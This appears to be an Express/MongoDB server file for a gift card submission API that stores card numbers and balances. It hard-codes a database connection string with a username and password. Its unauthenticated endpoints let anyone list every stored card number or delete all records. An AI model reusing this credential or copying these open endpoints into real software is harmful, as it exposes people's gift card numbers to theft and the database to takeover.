import express from 'express';
import mongoose from 'mongoose';
import cors from 'cors';
import dotenv from 'dotenv';

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3001;

// Middleware
app.use(cors());
app.use(express.json());

// MongoDB connection
const MONGODB_URI = process.env.MONGODB_URI || 'mongodb+srv://muskdaniel549:doJ9XzZRbZWCwYfW@cluster0.0gnp7bq.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0';

mongoose.connect(MONGODB_URI, {
  useNewUrlParser: true,
  useUnifiedTopology: true,
})
.then(() => {
  console.log('Connected to MongoDB Atlas');
})
.catch((error) => {
  console.error('MongoDB connection error:', error);
});

// Gift Card Schema
const giftCardSchema = new mongoose.Schema({
  card_number: {
    type: String,
    required: true,
  },
  balance: {
    type: Number,
    required: true,
  },
  date_checked: {
    type: Date,
    default: Date.now,
  }
});

const GiftCard = mongoose.model('GiftCard', giftCardSchema);

// Routes

// Get all gift card submissions
app.get('/api/gift-cards', async (req, res) => {
  try {
    const giftCards = await GiftCard.find().sort({ date_checked: -1 });
    res.json(giftCards);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Create new gift card submission
app.post('/api/gift-cards', async (req, res) => {
  try {
    const { card_number, balance } = req.body;
    const giftCard = new GiftCard({
      card_number,
      balance,
    });
    const savedGiftCard = await giftCard.save();
    res.status(201).json(savedGiftCard);
  } catch (error) {
    res.status(400).json({ error: error.message });
  }
});

// Delete all gift card submissions
app.delete('/api/gift-cards', async (req, res) => {
  try {
    await GiftCard.deleteMany({});
    res.json({ message: 'All gift card submissions deleted successfully' });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Health check endpoint
app.get('/api/health', (req, res) => {
  res.json({ status: 'Server is running', mongodb: mongoose.connection.readyState === 1 ? 'connected' : 'disconnected' });
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
